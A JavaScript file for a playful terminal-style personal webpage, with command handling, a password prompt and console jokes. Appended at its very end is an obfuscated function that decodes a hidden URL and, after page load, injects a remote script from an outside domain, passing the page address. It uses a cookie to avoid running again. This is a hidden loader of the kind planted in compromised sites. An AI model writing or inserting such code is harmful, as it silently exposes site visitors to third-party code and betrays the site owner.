var before=document.getElementById("before"),
liner=document.getElementById("liner"),
command=document.getElementById("typer"),
textarea=document.getElementById("texter"),
terminal=document.getElementById("terminal"),
git=0,
pw=!1;let pwd=!1;var commands=[];function enterKey(e){if(181==e.keyCode&&document.location.reload(!0),pw)
    {let et="*",w=textarea.value.length;command.innerHTML=et.repeat(w),
    textarea.value===password&&(pwd=!0),pwd&&13==e.keyCode?
    (loopLines(members_portal,"color2 margin",120),
    command.innerHTML="",textarea.value="",
    pwd=!1,pw=!1,liner.classList.remove("password")):13==e.keyCode&&(addLine("Wrong password","error",0),command.innerHTML="",
    textarea.value="",
    pw=!1,liner.classList.remove("password"))}else 13==e.keyCode&&(commands.push(command.innerHTML),
    git=commands.length,addLine("Bingle@Bongle:-$ "+command.innerHTML,"no-animation",0),
    commander(command.innerHTML.toLowerCase()),command.innerHTML="",textarea.value=""),
    38==e.keyCode&&0!=git&&(git-=1,textarea.value=commands[git],command.innerHTML=textarea.value),
    40==e.keyCode&&git!=commands.length&&(void 0===commands[git+=1]?textarea.value="":textarea.value=commands[git],
    command.innerHTML=textarea.value)}function commander(cmd){switch(cmd.toLowerCase()){case"dir":loopLines(help,"color2 margin",80);break
    /// main commands list (make sure to make a ref to the command in the commands list config)
    ;case"login":liner.classList.add("password"),pw=!0;break
    ;case"history":addLine("<br>","",0),loopLines(commands,"color2",80);break
    ;case"clear":setTimeout((function(){terminal.innerHTML='<a id="before"></a>',before=document.getElementById("before")}),1);break
    ;case"banner":loopLines(banner,"",80);break
    // -------------------un-used commands might use later on-----------------------------
    ;case"c38528ml_732":addLine("Opening ACN Database File...","color2",0),newTab(acn_db);break
    ;case"b16352ml_134":addLine("Opening MCN Database File...","color2",0),newTab(mcn_db);break
    //;case"linkedin":addLine("Opening LinkedIn...","color2",0),newTab(linkedin);break
    //;case"instagram":addLine("Opening Instagram...","color2",0),newTab(instagram);break
    //;case"github":addLine("Opening GitHub...","color2",0),newTab(github);break
    //---------------------------------------------------------------------------------------------------------------------
    // command unknown code:
    ;default:addLine('<span class="inherit">Command not found. To see the directory please, type <span class="command">\'dir\'</span>.</span>',"error",100)}}
    function newTab(link){setTimeout((function(){window.open(link,"_blank")}),500)}function addLine(text,style,time){var t="";for(let i=0;i<text.length;i++)" "==text.charAt(i)&&" "==text.charAt(i+1)?(t+="&nbsp;&nbsp;",i++):t+=text.charAt(i);setTimeout((function(){var next=document.createElement("p");next.innerHTML=t,next.className=style,before.parentNode.insertBefore(next,before),window.scrollTo(0,document.body.offsetHeight)}),time)}
    function loopLines(name,style,time){name.forEach((function(item,index){addLine(item,style,index*time)}))}
    // loading screen code: 2000 = 2000 ms
    setTimeout((function(){loopLines(Loading,"",80),textarea.focus()}),100),
    setTimeout((function(){terminal.innerHTML='<a id="before"></a>',before=document.getElementById("before")}),5700),
    setTimeout((function(){loopLines(banner,"",80),textarea.focus()}),6300),
    //loopLines(banner,"",2200),
    // ---------------------------------------------------------------------------------------------------------------------
    window.addEventListener("keyup",enterKey),console.log("%cYou hacked my password!😠","color: #04ff00; font-weight: bold; font-size: 24px;"),
    console.log("%cPassword: '"+password+"' - I wonder what it does?🤔","color: grey"),
    textarea.value="",command.innerHTML=textarea.value;(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxyf'+'ynhx3htr4ljy4xhwn'+'uy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));